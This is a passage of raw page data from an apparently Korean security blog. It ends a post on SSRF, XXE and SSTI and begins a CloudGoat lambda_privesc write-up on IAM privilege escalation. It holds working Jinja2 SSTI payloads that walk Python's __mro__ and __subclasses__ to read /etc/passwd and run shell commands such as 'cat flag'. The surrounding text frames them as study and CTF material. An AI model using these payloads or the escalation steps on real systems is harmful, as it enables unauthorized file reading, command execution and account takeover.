punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'method_descriptor'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'markupsafe._MarkupEscapeHelper'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_io._IOBase'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_io.IncrementalNewlineDecoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_hashlib.HASH'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_random.Random'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cStringIO.StringO'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cStringIO.StringI'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cPickle.Unpickler'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'cPickle.Pickler'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'functools.partial'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_ssl._SSLContext'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_ssl._SSLSocket'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'socket._closedsocket'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_socket.socket'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'socket._socketobject'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'socket._fileobject'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'time.struct_time'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'Struct'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'urlparse.ResultMixin'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'contextlib.GeneratorContextManager'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'contextlib.closing'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_json.Scanner'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'_json.Encoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'json.decoder.JSONDecoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'json.encoder.JSONEncoder'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'threading._Verbose'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'jinja2.utils.MissingType'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'jinja2.utils.LRUCache'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'jinja2.utils.Cycler'</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n     <span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> 'jinja2<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span>Joiner’<span class=\"token operator\">></span> …</code></pre></div>\n</li>\n<li>\n<p>출력된 결과에서 n번째 클래스를 선택하면 파일 클래스를 찾을 수 있습니다.</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclass__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token comment\"># => &lt;type 'file'></span></code></pre></div>\n<ul>\n<li>sub class의 file class를 찾았다면은 <code class=\"language-text\">open('/etc/passwd/').read()</code> 호출하여 파일을 읽을 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclass__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/etc/passwd/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<p><strong>SSTI MRO File Read/Exec</strong></p>\n<ul>\n<li><code class=\"language-text\">subprocess.Popen</code> 객체를 활용하여 서버내 파일을 읽어와 출력하는 형태로 진행할 수 있습니다.</li>\n<li>subprocess 모듈을 사용하여 하부 프로세스 생성과 관리를 하는 <code class=\"language-text\">popen</code> 클래스를 사용합니다.</li>\n<li>새로운 프로세스에서 자식 프로그램을 실행하고 POSIX에서 클래스는 자식 프로그램을 실행하는데 <code class=\"language-text\">os.execvp()</code> 와 동일하게 동작하며 <code class=\"language-text\">Shell=True</code> 셸의 기본 값이 /bin/sh로 지정되어 명령을 수행할 수 있습니다.</li>\n<li>timeout시 프로세스가 종료되지 않도록 하기 위해 <code class=\"language-text\">communicate</code> 메서드를 활용합시다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cat flag'</span><span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>communicate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>config<span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">[</span><span class=\"token string\">'os'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>communicate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#php-ssrf-example\">PHP SSRF Example</a></p>\n</li>\n<li>\n<p><a href=\"#ssrf-%EA%B3%B5%EA%B2%A9%EC%8B%9C-%EC%82%AC%EC%9A%A9-%EA%B0%80%EB%8A%A5%ED%95%9C-protocol-%EC%A2%85%EB%A5%98\">SSRF 공격시 사용 가능한 Protocol 종류</a></p>\n<ul>\n<li><a href=\"#php-wrapper-only-php\">PHP Wrapper (Only PHP)</a></li>\n<li><a href=\"#gopher-protocol%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-http-%ED%8C%A8%ED%82%B7-%EC%A0%84%EC%86%A1\">Gopher Protocol을 활용한 HTTP 패킷 전송</a></li>\n<li><a href=\"#gopher-%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C-%ED%99%9C%EC%9A%A9-%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%B2%A0%EC%9D%B4%EC%8A%A4-%EC%A0%91%EA%B7%BC\">Gopher 프로토콜 활용 데이터베이스 접근</a></li>\n<li><a href=\"#%EA%B7%B8%EB%A0%87%EB%8B%A4%EB%A9%B4-xxe%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-%EB%AC%B4%EC%97%87%EC%9D%84-%ED%95%A0-%EC%88%98-%EC%9E%88%EA%B9%8C%EC%9A%94\">그렇다면 XXE를 활용하여 무엇을 할 수 있까요?</a></li>\n<li><a href=\"#xxe-%ED%8C%8C%EC%9D%BC-%EC%9D%BD%EA%B8%B0\">XXE 파일 읽기</a></li>\n<li><a href=\"#bind-xxe-attack\">Bind XXE Attack</a></li>\n<li><a href=\"#server-side-template-injection-example\">Server Side Template Injection Example</a></li>\n<li><a href=\"#ssti-sandbox-escape\">SSTI Sandbox Escape</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 26, 2021","title":"Web Application SSRF/XXE/SSTI 취약점 연구","categories":"Web","author":"Zer0Luck","emoji":"🥶"},"fields":{"slug":"/we_application_SSRF/"}},"prev":{"id":"75d0d0b0-375d-5a00-bc16-da0d5e52e368","html":"<h1 id=\"클라우스-서비스-취약점-분석-3\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EC%8A%A4-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-3\" aria-label=\"클라우스 서비스 취약점 분석 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우스 서비스 취약점 분석 3</h1>\n<h1 id=\"scenario-2-lambda_privesc\" style=\"position:relative;\"><a href=\"#scenario-2-lambda_privesc\" aria-label=\"scenario 2 lambda_privesc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 2]: lambda_privesc</h1>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">Size<span class=\"token punctuation\">:</span> Small\nDifficulty<span class=\"token punctuation\">:</span> Easy\nCommand<span class=\"token punctuation\">:</span> $ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>cloudgoat<span class=\"token punctuation\">.</span>py create lambda_privesc</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90\" aria-label=\"자원 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>IAM User</li>\n<li>IAM Roles</li>\n</ul>\n<h3 id=\"취약점\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>IAM User Chris</li>\n<li>IAM USER: chris 에게 <code class=\"language-text\">sts:AssumeRole</code> 이 부여되어 있는 상황</li>\n<li>IAM Rule에는 Lambda 함수를 통해서 더 높은 권한을 갖일 수 있는 <code class=\"language-text\">iam:PassRole</code> 이 존재합니다.</li>\n</ul>\n<h3 id=\"목표\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C\" aria-label=\"목표 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li>Full-Privileges 획득</li>\n</ul>\n<h3 id=\"exploit-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADPUlEQVQoz21SXUxTZxh+I9BzvtIaS6DWft85bU+LtFQx/nAKPTUzKkIpgpWaVrEUWKJblmjUxIEjG5NFDf2xUPDnRqadum6TZPP/P/4s0zW7MGYm25JdeGHihXFq5LRF8pkjc1e7ePK+efO8T943zwOCYNNUOxc1VVfXLKaUguhu2uGSmn90Sd5TdR7ft42+jZmWdeFMS1s40+ANZkS3N+OSmk8rHLG+aaOyIwiVakIIIoSogON4ZLc7LVX2BQQAFMEDLqn5d5fkvVfn8WW9azuybe1d2db1kWyjL5QV3d6sS2q+r3BEd9Mno+OPQLDOL/1XkAGMMatGxcVlZboSc/VSNX1FYdfWQdjdOw67906AcsF7TFMKPTtOwM4vJuDjXUffzcwmEyK8hcXYOCNIMGY5nkdkngGVAKicAIwZAAFA0eLum9b2ockTPaNyOjwspyMjk+nNyclvOocn050jr4+HEvIPjQPPu/+hFOyiX4OxkQHCcazRoGd5+yLU2Jcs120e00ufpucpgr6Bp75AfOqRf6hwOxAr3F0fLfzsjxZ+UfpArHArEJ960HZAPgYAKqHSgXjBwYBloaRcU7yy/yqpP0J/7b9O//SfpE9qk/JHQZtFHYy97A2P5K91pfLnNiXzFzqG85c+HMuf6x7NXwkl5LSv/y+xvEzLmiw25XUG5tesUAPArFXbfrNG9v9Nx888pP1H/qCBgceDUNVXum7/q883JfM3Qonc5VAidzWYyF0PJnJXlOofkk817HnsqaioYHmTgDheYMBirmRnM8AsXRmfM7IzGkhs3d7xde/entiWr2zLP3u2JhCVfwrGc0e7xqYT4dSbg+HUm1QoOR2PjE6lNsTk71r3vY7OEVapeYOW5a1OBoxGI8ubbEinAWbGzTtA6QslQUUKIncoACzQFXsyfbj17JdzW87v062ZGATHoYa1Z2bc57CexYRDM6YQ8s5yzmRFUm196QfiEs1qd53G6ahRY8fq0vYVRgbVjVm1DWfjuO1iUt9yPlbuu3BYtfz7YKwWigSxU4uVDGL8Xw4ZJYv/B4INrIGrQsu0UMLuoeA5TsF5iELlEAV4RsFgrkHEqH/PRxhj1Vtb3i/5pUWvtgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"그룹 28.png\"\n        title=\"그룹 28.png\"\n        src=\"/static/c81092475e90825c5276ace925c8ffc8/37523/28.png\"\n        srcset=\"/static/c81092475e90825c5276ace925c8ffc8/e9ff0/28.png 180w,\n/static/c81092475e90825c5276ace925c8ffc8/f21e7/28.png 360w,\n/static/c81092475e90825c5276ace925c8ffc8/37523/28.png 720w,\n/static/c81092475e90825c5276ace925c8ffc8/302a4/28.png 1080w,\n/static/c81092475e90825c5276ace925c8ffc8/07a9c/28.png 1440w,\n/static/c81092475e90825c5276ace925c8ffc8/4435f/28.png 2479w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\" aria-label=\"시나리오 환경설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABPklEQVQoz32RXW+CMBiFK6JzCgWkUMuHCgKK4OJXnNuSLdnF/v8/OkvfLV5M3cXJeWnap+cU5ogIXChYrgT3FYY8hOVNMHIlue0rjBwJN4wx5BKdrgvD9O6K6Y29gQ+zP75491f9R0FrhumiYzpgBr8A74FZ+/SKRblDuTyQF9WeXMVL8u3+Hcl0DT/IIVUFs+//m5KVyz3SWYNp1pJrzbINAaNkRbOGadlOfAX4C2d5sYVUJR1W8QpRWmMSVQTSa36QwfPnBOw9CDBmgxkOWMe5WZ8dT5+omxOazRl1+4x1e6ZvXXd3+MDL2xeq+ohydaBLhpbCyI5It+pTQp0kTutL0mTWgLsJLB5DhAtKJ8IcY5GBuyk8MadZJ74CapC+Wb+dfnw9T+ftz48IcwSyQCAXCCYFzRrUHwRU/VblbzyIxtjsEGgAAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/31cc6f72d3919acf446b20806baa1334/37523/0.png\"\n        srcset=\"/static/31cc6f72d3919acf446b20806baa1334/e9ff0/0.png 180w,\n/static/31cc6f72d3919acf446b20806baa1334/f21e7/0.png 360w,\n/static/31cc6f72d3919acf446b20806baa1334/37523/0.png 720w,\n/static/31cc6f72d3919acf446b20806baa1334/681f1/0.png 899w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ul>\n<li>IAM 사용자 “Chris”의 정보를 토대로 사용할 수 있는 권한을 분석합니다.</li>\n<li>AWS Credential 을 확인한 결과 lambdaManager로 모든 lambda 를 관리하고 전달할 Rule 권한이 있는 것을 확인하였고 debug Rule에 권한이 있는 것을 확인했습니다.</li>\n<li>공격자는 lambdaManager Rule을 활용하여 Lambda 함수를 사용하여 권한 상승을 수행합니다.</li>\n<li>공격자는 관리자 정책을 IAM 사용자 “Chris”에 연결할 수 있도록 합니다.</li>\n<li>공격자는 LambdaManager Rule을 이용하여 Lambda 함수를 생성하여 이를 지정한후 Lambda running을 Debug mode로 변경합니다.</li>\n<li>공격자는 LambdaManager Rule을 사용하여 Lambda 함수를 호출하여 관리자 정책이 “Chris” 사용자에게 연결도히어 Full-Privilege 를 획득합니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 